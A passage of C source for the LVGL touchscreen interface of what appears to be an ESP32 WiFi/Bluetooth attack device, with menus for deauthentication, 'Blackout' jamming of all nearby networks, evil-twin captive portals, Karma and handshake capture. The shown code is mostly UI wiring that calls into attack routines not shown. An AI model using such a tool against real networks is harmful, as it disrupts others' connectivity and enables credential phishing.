    lv_obj_t *header_label = lv_label_create(function_page);
    lv_label_set_text(header_label, "Selected Networks:");
    lv_obj_set_style_text_font(header_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(header_label, COLOR_MATERIAL_BLUE, 0);
    lv_obj_align(header_label, LV_ALIGN_TOP_LEFT, 10, 122);
    
    // Selected networks list
    lv_obj_t *network_list = lv_obj_create(function_page);
    lv_obj_set_size(network_list, lv_pct(100), LCD_V_RES - 30 - 70 - 40);  // Remaining height (extra 10px for header)
    lv_obj_align(network_list, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(network_list, COLOR_MATERIAL_BG, 0);
    lv_obj_set_style_border_width(network_list, 0, 0);
    lv_obj_set_style_pad_all(network_list, 10, 0);
    lv_obj_set_flex_flow(network_list, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_gap(network_list, 5, 0);
    
    // Get selected networks and display them
    int selected_indices[SCAN_RESULTS_MAX_DISPLAY];
    int selected_count = wifi_scanner_get_selected(selected_indices, SCAN_RESULTS_MAX_DISPLAY);
    const wifi_ap_record_t *records = wifi_scanner_get_results_ptr();
    const uint16_t *count_ptr = wifi_scanner_get_count_ptr();
    uint16_t total_count = count_ptr ? *count_ptr : 0;
    
    if (selected_count <= 0 || !records || total_count == 0) {
        lv_obj_t *no_sel_label = lv_label_create(network_list);
        lv_label_set_text(no_sel_label, "No networks selected");
        lv_obj_set_style_text_color(no_sel_label, COLOR_MATERIAL_BLUE, 0);
        lv_obj_set_style_text_font(no_sel_label, &lv_font_montserrat_14, 0);
    } else {
        for (int i = 0; i < selected_count; i++) {
            int idx = selected_indices[i];
            if (idx < 0 || idx >= (int)total_count) continue;
            
            const wifi_ap_record_t *ap = &records[idx];
            char line[64];
            const char *band = (ap->primary <= 14) ? "2.4" : "5";
            
            if (ap->ssid[0] != 0) {
                snprintf(line, sizeof(line), "%s (%s)", (const char *)ap->ssid, band);
            } else {
                snprintf(line, sizeof(line), "%02X:%02X:%02X:%02X:%02X:%02X (%s)",
                         ap->bssid[0], ap->bssid[1], ap->bssid[2],
                         ap->bssid[3], ap->bssid[4], ap->bssid[5], band);
            }
            
            lv_obj_t *net_label = lv_label_create(network_list);
            lv_label_set_text(net_label, line);
            lv_obj_set_style_text_color(net_label, COLOR_MATERIAL_BLUE, 0);
            lv_obj_set_style_text_font(net_label, &lv_font_montserrat_14, 0);
        }
    }
}

// Global WiFi Attacks screen
static void show_global_attacks_screen(void)
{
    create_function_page_base("Global WiFi Attacks");
    
    lv_obj_t *tiles = lv_obj_create(function_page);
    lv_obj_set_size(tiles, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(tiles, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(tiles, COLOR_MATERIAL_BG, 0);
    lv_obj_set_style_border_width(tiles, 0, 0);
    lv_obj_set_style_pad_all(tiles, 10, 0);
    lv_obj_set_style_pad_gap(tiles, 10, 0);
    lv_obj_set_flex_flow(tiles, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_set_flex_align(tiles, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER);
    
    // Blackout tile - Red (dangerous)
    lv_obj_t *blackout_tile = create_tile(tiles, LV_SYMBOL_POWER, "Blackout", COLOR_MATERIAL_RED, NULL, NULL);
    lv_obj_add_event_cb(blackout_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"Blackout");
    
    // Handshaker tile - Amber
    lv_obj_t *handshaker_tile = create_tile(tiles, LV_SYMBOL_DOWNLOAD, "Handshaker", COLOR_MATERIAL_AMBER, NULL, NULL);
    lv_obj_add_event_cb(handshaker_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"Handshakes");
    
    // Portal tile - Orange
    lv_obj_t *portal_tile = create_tile(tiles, LV_SYMBOL_WIFI, "Portal", COLOR_MATERIAL_ORANGE, NULL, NULL);
    lv_obj_add_event_cb(portal_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"Portal");
    
    // Snifferdog tile - Purple
    lv_obj_t *snifferdog_tile = create_tile(tiles, LV_SYMBOL_EYE_OPEN, "Sniffer dog", COLOR_MATERIAL_PURPLE, NULL, NULL);
    lv_obj_add_event_cb(snifferdog_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"Snifferdog");
    
    // Wardrive tile - Teal
    lv_obj_t *wardrive_tile = create_tile(tiles, LV_SYMBOL_GPS, "Wardrive", COLOR_MATERIAL_TEAL, NULL, NULL);
    lv_obj_add_event_cb(wardrive_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"Start Wardrive");
}

// WiFi Sniff & Karma screen
static void show_sniff_karma_screen(void)
{
    create_function_page_base("WiFi Sniff & Karma");
    
    lv_obj_t *tiles = lv_obj_create(function_page);
    lv_obj_set_size(tiles, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(tiles, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(tiles, COLOR_MATERIAL_BG, 0);
    lv_obj_set_style_border_width(tiles, 0, 0);
    lv_obj_set_style_pad_all(tiles, 10, 0);
    lv_obj_set_style_pad_gap(tiles, 10, 0);
    lv_obj_set_flex_flow(tiles, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_set_flex_align(tiles, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER);
    
    // Sniffer tile - Purple
    lv_obj_t *sniffer_tile = create_tile(tiles, LV_SYMBOL_EYE_OPEN, "Sniffer", COLOR_MATERIAL_PURPLE, NULL, NULL);
    lv_obj_add_event_cb(sniffer_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"Sniffer");
    
    // Browse Clients tile - Indigo
    lv_obj_t *clients_tile = create_tile(tiles, LV_SYMBOL_LIST, "Browse\nClients", COLOR_MATERIAL_INDIGO, NULL, NULL);
    lv_obj_add_event_cb(clients_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"Browse Clients");
    
    // Show Probes tile - Teal
    lv_obj_t *probes_tile = create_tile(tiles, LV_SYMBOL_CALL, "Show\nProbes", COLOR_MATERIAL_TEAL, NULL, NULL);
    lv_obj_add_event_cb(probes_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"Show Probes");
    
    // Karma tile - Pink
    lv_obj_t *karma_tile = create_tile(tiles, LV_SYMBOL_SHUFFLE, "Karma", COLOR_MATERIAL_PINK, NULL, NULL);
    lv_obj_add_event_cb(karma_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"Karma");
}

// WiFi Monitor screen
static void show_wifi_monitor_screen(void)
{
    create_function_page_base("WiFi Monitor");
    
    lv_obj_t *tiles = lv_obj_create(function_page);
    lv_obj_set_size(tiles, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(tiles, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(tiles, COLOR_MATERIAL_BG, 0);
    lv_obj_set_style_border_width(tiles, 0, 0);
    lv_obj_set_style_pad_all(tiles, 10, 0);
    lv_obj_set_style_pad_gap(tiles, 10, 0);
    lv_obj_set_flex_flow(tiles, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_set_flex_align(tiles, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    
    // Package Monitor - stub - Green
    lv_obj_t *pkg_tile = create_tile(tiles, LV_SYMBOL_DOWNLOAD, "Package\nMonitor", COLOR_MATERIAL_GREEN, NULL, NULL);
    lv_obj_add_event_cb(pkg_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"Package Monitor");
    
    // Channel View - stub - Teal
    lv_obj_t *chan_tile = create_tile(tiles, LV_SYMBOL_LIST, "Channel\nView", COLOR_MATERIAL_TEAL, NULL, NULL);
    lv_obj_add_event_cb(chan_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"Channel View");
}

// Bluetooth screen
static void show_bluetooth_screen(void)
{
    create_function_page_base("Bluetooth");
    
    lv_obj_t *tiles = lv_obj_create(function_page);
    lv_obj_set_size(tiles, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(tiles, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(tiles, COLOR_MATERIAL_BG, 0);
    lv_obj_set_style_border_width(tiles, 0, 0);
    lv_obj_set_style_pad_all(tiles, 10, 0);
    lv_obj_set_style_pad_gap(tiles, 10, 0);
    lv_obj_set_flex_flow(tiles, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_set_flex_align(tiles, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    
    // AirTag scan - stub - Apple-like gray
    lv_obj_t *airtag_tile = create_tile(tiles, LV_SYMBOL_GPS, "AirTag\nscan", lv_color_make(142, 142, 147), NULL, NULL);
    lv_obj_add_event_cb(airtag_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"AirTag scan");
    
    // BT Scan - existing BLE Scan - Cyan
    lv_obj_t *bt_tile = create_tile(tiles, LV_SYMBOL_BLUETOOTH, "BT Scan", COLOR_MATERIAL_CYAN, NULL, NULL);
    lv_obj_add_event_cb(bt_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"BLE Scan");
    
    // BT Locator - stub - Blue
    lv_obj_t *locator_tile = create_tile(tiles, LV_SYMBOL_EYE_OPEN, "BT Locator", COLOR_MATERIAL_BLUE, NULL, NULL);
    lv_obj_add_event_cb(locator_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"BT Locator");
}

// Stub screen for not-yet-implemented features
static void show_stub_screen(const char *name)
{
    create_function_page_base(name);
    
    lv_obj_t *label = lv_label_create(function_page);
    lv_label_set_text(label, "Coming Soon");
    lv_obj_set_style_text_font(label, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(label, lv_color_make(255, 255, 255), 0);  // White
    lv_obj_center(label);
    
    lv_obj_t *sublabel = lv_label_create(function_page);
    lv_label_set_text(sublabel, "This feature is under development");
    lv_obj_set_style_text_font(sublabel, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(sublabel, lv_color_make(176, 176, 176), 0);  // Light gray #B0B0B0
    lv_obj_align(sublabel, LV_ALIGN_CENTER, 0, 40);
}

// ============================================================================
// END TILE-BASED NAVIGATION SYSTEM
// ============================================================================

static void show_evil_twin_page(void)
{
    create_function_page_base("Evil Twin");
    wifi_attacks_refresh_sd_html_list();

    evil_twin_content = lv_obj_create(function_page);
    lv_obj_set_size(evil_twin_content, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(evil_twin_content, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_opa(evil_twin_content, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(evil_twin_content, 0, 0);
    lv_obj_set_style_pad_all(evil_twin_content, 10, 0);
    lv_obj_set_style_pad_gap(evil_twin_content, 10, 0);
    lv_obj_set_flex_flow(evil_twin_content, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(evil_twin_content, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);

    // Status label at the top
    evil_twin_status_label = lv_label_create(evil_twin_content);
    lv_obj_set_style_text_font(evil_twin_status_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(evil_twin_status_label, COLOR_MATERIAL_BLUE, 0);  // Green text
    lv_label_set_text(evil_twin_status_label, "Select network and portal template");

    lv_obj_t *net_label = lv_label_create(evil_twin_content);
    lv_label_set_text(net_label, "Evil Twin name:");
    lv_obj_set_style_text_font(net_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(net_label, COLOR_MATERIAL_BLUE, 0);  // Green text

    evil_twin_network_dd = lv_dropdown_create(evil_twin_content);
    lv_obj_set_width(evil_twin_network_dd, lv_pct(100));
    lv_dropdown_set_dir(evil_twin_network_dd, LV_DIR_BOTTOM);
    // Retro terminal styling for dropdown
    lv_obj_set_style_bg_color(evil_twin_network_dd, lv_color_make(0, 0, 0), LV_PART_MAIN);  // Black background
    lv_obj_set_style_text_color(evil_twin_network_dd, COLOR_MATERIAL_BLUE, LV_PART_MAIN);  // Green text
    lv_obj_set_style_border_color(evil_twin_network_dd, COLOR_MATERIAL_BLUE, LV_PART_MAIN);  // Green border
    lv_obj_t *dd_list1 = lv_dropdown_get_list(evil_twin_network_dd);
    if (dd_list1) {
        lv_obj_set_style_bg_color(dd_list1, lv_color_make(0, 0, 0), 0);  // Black background for list
        lv_obj_set_style_text_color(dd_list1, COLOR_MATERIAL_BLUE, 0);  // Green text for list
        lv_obj_set_style_border_color(dd_list1, COLOR_MATERIAL_BLUE, 0);  // Green border
    }

    evil_twin_network_count = 0;
    int selected_indices[SCAN_RESULTS_MAX_DISPLAY];
    int selected_count = wifi_scanner_get_selected(selected_indices, SCAN_RESULTS_MAX_DISPLAY);
    const wifi_ap_record_t *records = wifi_scanner_get_results_ptr();
    const uint16_t *count_ptr = wifi_scanner_get_count_ptr();
    uint16_t total_count = count_ptr ? *count_ptr : 0;

    size_t max_networks = (selected_count < SCAN_RESULTS_MAX_DISPLAY) ? selected_count : SCAN_RESULTS_MAX_DISPLAY;
    size_t net_buf_size = (max_networks > 0 ? max_networks : 1) * 64;
    char *net_options = (char *)lv_mem_alloc(net_buf_size);
    if (!net_options) {
        net_options = "No networks selected";
        max_networks = 0;
    }

    size_t net_len = 0;
    if (net_options != (char *)"No networks selected") {
        net_options[0] = '\0';
    }

    for (int i = 0; i < selected_count && i < SCAN_RESULTS_MAX_DISPLAY; i++) {
        int idx = selected_indices[i];
        if (!records || idx < 0 || idx >= total_count) {
            continue;
        }

        char entry[64];
        if (records[idx].ssid[0]) {
            snprintf(entry, sizeof(entry), "%s (%d dBm)\n", (const char *)records[idx].ssid, records[idx].rssi);
        } else {
            snprintf(entry, sizeof(entry), "%02X:%02X:%02X:%02X:%02X:%02X (%d dBm)\n",
                     records[idx].bssid[0], records[idx].bssid[1], records[idx].bssid[2],
                     records[idx].bssid[3], records[idx].bssid[4], records[idx].bssid[5],
                     records[idx].rssi);
        }

        size_t entry_len = strlen(entry);
        if (net_options != (char *)"No networks selected" && net_len + entry_len < net_buf_size) {
            memcpy(net_options + net_len, entry, entry_len);
            net_len += entry_len;
            net_options[net_len] = '\0';
            evil_twin_network_map[evil_twin_network_count++] = idx;
        }
    }

    if (evil_twin_network_count == 0) {
        if (net_options != (char *)"No networks selected") {
            snprintf(net_options, net_buf_size, "No networks selected");
        }
        evil_twin_network_count = 0;
    }

    lv_dropdown_set_options(evil_twin_network_dd, net_options);
    lv_dropdown_set_selected(evil_twin_network_dd, 0);

    if (net_options != (char *)"No networks selected") {
        lv_mem_free(net_options);
    }

    lv_obj_t *html_label = lv_label_create(evil_twin_content);
    lv_label_set_text(html_label, "HTML Portal");
    lv_obj_set_style_text_font(html_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(html_label, COLOR_MATERIAL_BLUE, 0);  // Green text

    evil_twin_html_dd = lv_dropdown_create(evil_twin_content);
    lv_obj_set_width(evil_twin_html_dd, lv_pct(100));
    lv_dropdown_set_dir(evil_twin_html_dd, LV_DIR_BOTTOM);
    // Retro terminal styling for dropdown
    lv_obj_set_style_bg_color(evil_twin_html_dd, lv_color_make(0, 0, 0), LV_PART_MAIN);  // Black background
    lv_obj_set_style_text_color(evil_twin_html_dd, COLOR_MATERIAL_BLUE, LV_PART_MAIN);  // Green text
    lv_obj_set_style_border_color(evil_twin_html_dd, COLOR_MATERIAL_BLUE, LV_PART_MAIN);  // Green border
    lv_obj_t *dd_list2 = lv_dropdown_get_list(evil_twin_html_dd);
    if (dd_list2) {
        lv_obj_set_style_bg_color(dd_list2, lv_color_make(0, 0, 0), 0);  // Black background for list
        lv_obj_set_style_text_color(dd_list2, COLOR_MATERIAL_BLUE, 0);  // Green text for list
        lv_obj_set_style_border_color(dd_list2, COLOR_MATERIAL_BLUE, 0);  // Green border
    }

    int html_total = wifi_attacks_get_sd_html_count();
    size_t max_html = (html_total < SCAN_RESULTS_MAX_DISPLAY) ? html_total : SCAN_RESULTS_MAX_DISPLAY;
    size_t html_buf_size = (max_html > 0 ? max_html : 1) * 64;
    char *html_options = (char *)lv_mem_alloc(html_buf_size);
    if (!html_options) {
        html_options = "No HTML templates";
        max_html = 0;
    }

    size_t html_len = 0;
    if (html_options != (char *)"No HTML templates") {
        html_options[0] = '\0';
    }

    for (int i = 0; i < html_total && i < SCAN_RESULTS_MAX_DISPLAY; i++) {
        const char *name = wifi_attacks_get_sd_html_name(i);
        if (!name) {
            continue;
        }
        char entry[64];
        const char *display = strrchr(name, '/');
        if (display) {
            display++;
        } else {
            display = name;
        }
        snprintf(entry, sizeof(entry), "%s\n", display);
        size_t entry_len = strlen(entry);
        if (html_options != (char *)"No HTML templates" && html_len + entry_len < html_buf_size) {
            memcpy(html_options + html_len, entry, entry_len);
            html_len += entry_len;
            html_options[html_len] = '\0';
            evil_twin_html_map[evil_twin_html_count++] = i;
        }
    }

    if (evil_twin_html_count == 0) {
        if (html_options != (char *)"No HTML templates") {
            snprintf(html_options, html_buf_size, "No HTML templates");
        }
    }

    lv_dropdown_set_options(evil_twin_html_dd, html_options);
    lv_dropdown_set_selected(evil_twin_html_dd, 0);

    if (html_options != (char *)"No HTML templates") {
        lv_mem_free(html_options);
    }

    evil_twin_start_btn = lv_btn_create(evil_twin_content);
    lv_obj_set_width(evil_twin_start_btn, lv_pct(100));
    lv_obj_set_height(evil_twin_start_btn, 40);
    // Retro terminal styling for button with visible border
    lv_obj_set_style_bg_color(evil_twin_start_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black background
    lv_obj_set_style_bg_color(evil_twin_start_btn, COLOR_DARK_BLUE, LV_STATE_PRESSED);  // Dark green when pressed
    lv_obj_set_style_border_color(evil_twin_start_btn, COLOR_MATERIAL_BLUE, 0);  // Green border
    lv_obj_set_style_border_width(evil_twin_start_btn, 3, 0);  // Thick border (3px)
    lv_obj_set_style_border_opa(evil_twin_start_btn, LV_OPA_COVER, 0);  // Fully opaque border
    lv_obj_add_event_cb(evil_twin_start_btn, evil_twin_start_btn_cb, LV_EVENT_CLICKED, NULL);

    lv_obj_t *start_label = lv_label_create(evil_twin_start_btn);
    lv_label_set_text(start_label, "Start Evil Twin");
    lv_obj_set_style_text_color(start_label, COLOR_MATERIAL_BLUE, 0);  // Green text
    lv_obj_center(start_label);

    // Update status label based on availability
    if (evil_twin_network_count == 0 || evil_twin_html_count == 0) {
        lv_obj_add_state(evil_twin_start_btn, LV_STATE_DISABLED);
        if (evil_twin_network_count == 0) {
            lv_label_set_text(evil_twin_status_label, "No selected networks available");
        } else {
            lv_label_set_text(evil_twin_status_label, "No HTML templates found on SD card");
        }
    } else {
        lv_obj_clear_state(evil_twin_start_btn, LV_STATE_DISABLED);
    }
}

void menu_event_cb(lv_event_t *e)
{
	// Get user data from the clicked object
    
    // Avoid printf in event callback to reduce VFS contention
    
    if (lv_event_get_code(e) == LV_EVENT_CLICKED) {
        // Use event user data instead of raw object user_data to avoid invalid pointers
        const char *name = (const char *)lv_event_get_user_data(e);
        if (name != NULL) {
            show_function_page(name);
        }
    }
}

void attack_event_cb(lv_event_t *e)
{
    const char *attack_name = (const char *)lv_event_get_user_data(e);
    if (!attack_name) return;

    if (strcmp(attack_name, "Scan") == 0) {
        // Ensure WiFi mode is active (switch from BLE if needed)
        if (!ensure_wifi_mode()) {
            ESP_LOGE(TAG, "Failed to switch to WiFi mode for scan");
            return;
        }
        
        // Open scan page (clear previous content) - use base only to avoid default center label
        create_function_page_base("Scan");

        // Create spinner + status within function_page; ensure clean background
        lv_obj_set_style_bg_color(function_page, lv_color_make(0, 0, 0), 0);  // Black background
        lv_obj_set_style_bg_opa(function_page, LV_OPA_COVER, 0);

        // Keep touch dot visible during scan
        show_touch_dot = true;

        // Delete old scan_status_label if exists
        if (scan_status_label) {
            lv_obj_del(scan_status_label);
            scan_status_label = NULL;
        }

        // Create centered scanning container with icon and text
        lv_obj_t *scan_container = lv_obj_create(function_page);
        lv_obj_set_size(scan_container, LV_SIZE_CONTENT, LV_SIZE_CONTENT);
        lv_obj_center(scan_container);
        lv_obj_set_style_bg_opa(scan_container, LV_OPA_TRANSP, 0);
        lv_obj_set_style_border_width(scan_container, 0, 0);
        lv_obj_set_flex_flow(scan_container, LV_FLEX_FLOW_COLUMN);
        lv_obj_set_flex_align(scan_container, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
        lv_obj_set_style_pad_gap(scan_container, 10, 0);
        
        // WiFi scanning icon
        lv_obj_t *scan_icon = lv_label_create(scan_container);
        lv_label_set_text(scan_icon, LV_SYMBOL_WIFI);
        lv_obj_set_style_text_font(scan_icon, &lv_font_montserrat_20, 0);
        lv_obj_set_style_text_color(scan_icon, COLOR_MATERIAL_BLUE, 0);
        
        // Scanning text (larger)
        scan_status_label = lv_label_create(scan_container);
        lv_label_set_text(scan_status_label, "Scanning...");
        lv_obj_set_style_text_color(scan_status_label, COLOR_MATERIAL_BLUE, 0);
        lv_obj_set_style_text_font(scan_status_label, &lv_font_montserrat_20, 0);

        // Clear previous selections when user manually starts scan
        wifi_scanner_clear_selections();
        wifi_scanner_clear_targets();

        // Start scan
        wifi_scanner_start_scan();
        return;
    }

    if (strcmp(attack_name, "Deauther") == 0) {
        // Ensure WiFi mode is active (switch from BLE if needed)
        if (!ensure_wifi_mode()) {
            ESP_LOGE(TAG, "Failed to switch to WiFi mode for deauth");
            return;
        }
        
        // Open Deauther page
        show_function_page("Deauther");

        // Save current selection as attack targets, then start deauth
        wifi_scanner_save_target_bssids();
        wifi_attacks_start_deauth();
        
        // Store targets for rescan comparison and start rescan timer
        {
            int sel_indices[MAX_SCAN_RESULTS];
            int sel_count = wifi_scanner_get_selected(sel_indices, MAX_SCAN_RESULTS);
            uint16_t total_count = wifi_scanner_get_count();
            wifi_ap_record_t *recs = (wifi_ap_record_t *)lv_mem_alloc(sizeof(wifi_ap_record_t) * total_count);
            if (recs && total_count > 0) {
                int got_cnt = wifi_scanner_get_results(recs, total_count);
                deauth_target_count = 0;
                for (int i = 0; i < sel_count && deauth_target_count < MAX_SCAN_RESULTS; i++) {
                    int idx = sel_indices[i];
                    if (idx >= 0 && idx < got_cnt) {
                        memcpy(deauth_target_bssids[deauth_target_count], recs[idx].bssid, 6);
                        deauth_target_channels[deauth_target_count] = recs[idx].primary;
                        deauth_target_count++;
                    }
                }
                lv_mem_free(recs);
            }
            deauth_rescan_timer_start();
        }

        // Title centered at top - "Deauth attack in progress"
        deauth_prompt_label = lv_label_create(function_page);
        lv_label_set_text(deauth_prompt_label, "Deauth attack in progress");
        lv_obj_set_style_text_font(deauth_prompt_label, &lv_font_montserrat_16, 0);
        lv_obj_set_style_text_color(deauth_prompt_label, COLOR_MATERIAL_BLUE, 0);
        lv_obj_align(deauth_prompt_label, LV_ALIGN_TOP_MID, 0, 36);

        // FPS label (hidden, but kept for internal use)
        deauth_fps_label = lv_label_create(function_page);
        lv_label_set_text(deauth_fps_label, "");
        lv_obj_add_flag(deauth_fps_label, LV_OBJ_FLAG_HIDDEN);

        // Build list of attacked networks with SSID, Freq, BSSID
        if (deauth_list) { deauth_list = NULL; }
        deauth_list = lv_list_create(function_page);
        lv_obj_set_size(deauth_list, lv_pct(100), LCD_V_RES - 30 - 36 - 70);  // Leave space for stop tile
        lv_obj_align(deauth_list, LV_ALIGN_TOP_MID, 0, 60);
        lv_obj_set_style_bg_color(deauth_list, lv_color_make(0, 0, 0), 0);
        lv_obj_set_style_text_color(deauth_list, COLOR_MATERIAL_BLUE, 0);
        lv_obj_set_style_border_width(deauth_list, 0, LV_PART_ITEMS);
        lv_obj_set_style_border_color(deauth_list, lv_color_make(0, 0, 0), LV_PART_ITEMS);

        int selected_indices[MAX_SCAN_RESULTS];
        int sel_cnt = wifi_scanner_get_selected(selected_indices, MAX_SCAN_RESULTS);
        if (sel_cnt <= 0) {
            lv_list_add_text(deauth_list, "No networks selected");
        }

        uint16_t total = wifi_scanner_get_count();
        if (total == 0) {
            lv_list_add_text(deauth_list, "No scan results available");
        } else {
            wifi_ap_record_t *records = (wifi_ap_record_t *)lv_mem_alloc(sizeof(wifi_ap_record_t) * total);
            if (!records) {
                lv_list_add_text(deauth_list, "Memory error");
            } else {
                int got = wifi_scanner_get_results(records, total);

                for (int i = 0; i < sel_cnt; i++) {
                    int idx = selected_indices[i];
                    if (idx < 0 || idx >= got) continue;

                    const wifi_ap_record_t *ap = &records[idx];
                    char line[128];
                    const char *band = (ap->primary <= 14) ? "2.4" : "5";
                    
                    if (ap->ssid[0] != 0) {
                        snprintf(line, sizeof(line), "%s (Ch%d, %s) %02X:%02X:%02X:%02X:%02X:%02X",
                                 (const char *)ap->ssid, ap->primary, band,
                                 ap->bssid[0], ap->bssid[1], ap->bssid[2],
                                 ap->bssid[3], ap->bssid[4], ap->bssid[5]);
                    } else {
                        snprintf(line, sizeof(line), "(Ch%d, %s) %02X:%02X:%02X:%02X:%02X:%02X",
                                 ap->primary, band,
                                 ap->bssid[0], ap->bssid[1], ap->bssid[2],
                                 ap->bssid[3], ap->bssid[4], ap->bssid[5]);
                    }

                    lv_obj_t *row = lv_list_add_btn(deauth_list, NULL, "");
                    lv_obj_set_width(row, lv_pct(100));
                    lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
                    lv_obj_set_style_pad_all(row, 6, 0);
                    lv_obj_set_style_pad_gap(row, 8, 0);
                    lv_obj_set_height(row, LV_SIZE_CONTENT);
                    lv_obj_set_style_bg_color(row, lv_color_make(30, 30, 30), LV_STATE_DEFAULT);
                    lv_obj_set_style_bg_color(row, lv_color_make(50, 50, 50), LV_STATE_PRESSED);
                    lv_obj_set_style_radius(row, 8, 0);

                    lv_obj_t *lbl = lv_label_create(row);
                    lv_label_set_text(lbl, line);
                    lv_label_set_long_mode(lbl, LV_LABEL_LONG_SCROLL_CIRCULAR);
                    lv_obj_set_style_text_font(lbl, &lv_font_montserrat_12, 0);
                    lv_obj_set_style_text_color(lbl, COLOR_MATERIAL_BLUE, 0);
                    lv_obj_set_width(lbl, lv_pct(95));
                }

                lv_mem_free(records);
            }
        }

        // Stop & Exit tile at bottom (red with X icon)
        lv_obj_t *stop_tile = lv_btn_create(function_page);
        lv_obj_set_size(stop_tile, 120, 55);
        lv_obj_align(stop_tile, LV_ALIGN_BOTTOM_MID, 0, -10);
        lv_obj_set_style_bg_color(stop_tile, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(stop_tile, lv_color_lighten(COLOR_MATERIAL_RED, 50), LV_STATE_PRESSED);
        lv_obj_set_style_border_width(stop_tile, 0, 0);
        lv_obj_set_style_radius(stop_tile, 10, 0);
        lv_obj_set_style_shadow_width(stop_tile, 6, 0);
        lv_obj_set_style_shadow_color(stop_tile, lv_color_make(0, 0, 0), 0);
        lv_obj_set_style_shadow_opa(stop_tile, LV_OPA_40, 0);
        lv_obj_set_flex_flow(stop_tile, LV_FLEX_FLOW_COLUMN);
        lv_obj_set_flex_align(stop_tile, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
        
        lv_obj_t *x_icon = lv_label_create(stop_tile);
        lv_label_set_text(x_icon, LV_SYMBOL_CLOSE);
        lv_obj_set_style_text_font(x_icon, &lv_font_montserrat_20, 0);
        lv_obj_set_style_text_color(x_icon, lv_color_make(255, 255, 255), 0);
        
        lv_obj_t *stop_text = lv_label_create(stop_tile);
        lv_label_set_text(stop_text, "Stop & Exit");
        lv_obj_set_style_text_font(stop_text, &lv_font_montserrat_12, 0);
        lv_obj_set_style_text_color(stop_text, lv_color_make(255, 255, 255), 0);
        
        lv_obj_add_event_cb(stop_tile, deauth_quit_event_cb, LV_EVENT_CLICKED, NULL);
        
        // Store reference (reuse quit_btn pointer)
        deauth_quit_btn = stop_tile;
        deauth_pause_btn = NULL;  // No pause button anymore
        
        deauth_paused = false;
        return;
    }

    if (strcmp(attack_name, "Evil Twin") == 0) {
        show_evil_twin_page();
        return;
    }

    if (strcmp(attack_name, "Blackout") == 0) {
        // Show warning page - use base to avoid default center label
        create_function_page_base("Blackout");
        
        // Warning message in center
        lv_obj_t *warning_label = lv_label_create(function_page);
        lv_label_set_text(warning_label, "Warning: This will attack\nall the networks around you.\n\nAre you sure?");
        lv_obj_set_style_text_align(warning_label, LV_TEXT_ALIGN_CENTER, 0);
        lv_obj_set_style_text_color(warning_label, COLOR_MATERIAL_BLUE, 0);  // Green text
        lv_obj_set_style_text_font(warning_label, &lv_font_montserrat_16, 0);
        lv_obj_center(warning_label);
        
        // Button container at bottom (15px higher)
        lv_obj_t *btn_bar = lv_obj_create(function_page);
        lv_obj_set_size(btn_bar, lv_pct(100), 50);
        lv_obj_align(btn_bar, LV_ALIGN_BOTTOM_MID, 0, -15);  // 15px higher
        lv_obj_set_style_bg_color(btn_bar, lv_color_make(0, 0, 0), 0);  // Black background
        lv_obj_set_style_border_width(btn_bar, 0, 0);
        lv_obj_set_style_radius(btn_bar, 0, 0);
        lv_obj_clear_flag(btn_bar, LV_OBJ_FLAG_SCROLLABLE);
